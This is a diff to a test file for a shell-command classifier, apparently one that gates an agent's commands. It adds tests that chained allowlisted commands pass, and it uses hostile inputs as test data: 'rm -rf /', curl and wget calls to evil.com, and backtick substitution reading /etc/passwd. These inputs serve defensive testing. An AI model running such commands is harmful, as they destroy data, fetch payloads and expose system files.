@@ -176,17 +176,17 @@ describe("classifyCommand", () => {
   });
 
   describe("command chaining bypass prevention", () => {
-    it("detects semicolon command chaining", () => {
+    it("detects semicolon chaining with dangerous command", () => {
       const result = classifyCommand("echo hello; rm -rf /");
       expect(result.status).toBe("requires_confirmation");
     });
 
-    it("detects AND chaining", () => {
+    it("detects AND chaining with unknown command", () => {
       const result = classifyCommand("ls && curl http://evil.com");
       expect(result.status).toBe("requires_confirmation");
     });
 
-    it("detects OR chaining", () => {
+    it("detects OR chaining with unknown command", () => {
       const result = classifyCommand("git status || wget http://evil.com/payload");
       expect(result.status).toBe("requires_confirmation");
     });
@@ -204,6 +204,26 @@ describe("classifyCommand", () => {
     it("detects backtick substitution", () => {
       const result = classifyCommand("echo `cat /etc/passwd`");
       expect(result.status).toBe("requires_confirmation");
+    });
+
+    it("allows chaining of allowlisted commands with &&", () => {
+      const result = classifyCommand("git status && echo done");
+      expect(result.status).toBe("allowed");
+    });
+
+    it("allows piping between allowlisted commands", () => {
+      const result = classifyCommand("grep foo file.txt | wc -l");
+      expect(result.status).toBe("allowed");
+    });
+
+    it("allows semicolon between allowlisted commands", () => {
+      const result = classifyCommand("ls; pwd; echo hello");
+      expect(result.status).toBe("allowed");
+    });
+
+    it("allows complex pipe chains of allowlisted commands", () => {
+      const result = classifyCommand("cat file.txt | sort | uniq | wc -l");
+      expect(result.status).toBe("allowed");
     });
   });
 
